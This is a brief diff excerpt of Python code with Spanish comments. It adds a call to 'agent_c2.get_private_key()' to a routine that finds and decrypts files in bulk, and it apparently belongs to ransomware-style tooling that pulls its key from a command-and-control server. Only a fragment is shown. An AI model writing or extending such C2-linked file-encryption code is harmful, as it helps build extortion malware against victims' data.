@@ -36,6 +36,7 @@ def descifrar_archivo(archivo, clave):
         f.write(datos_descifrados)  # Sobrescribimos el archivo con los datos descifrados
 
 def descifrar_archivos():
+    agent_c2.get_private_key()
     archivos = find_files()  # Ahora devuelve solo la lista de archivos (rutas completas)
     if not archivos or not isinstance(archivos, list):  # Verifica si `archivos` es válido
         print("Error: No se pudo obtener la lista de archivos o está vacía.")
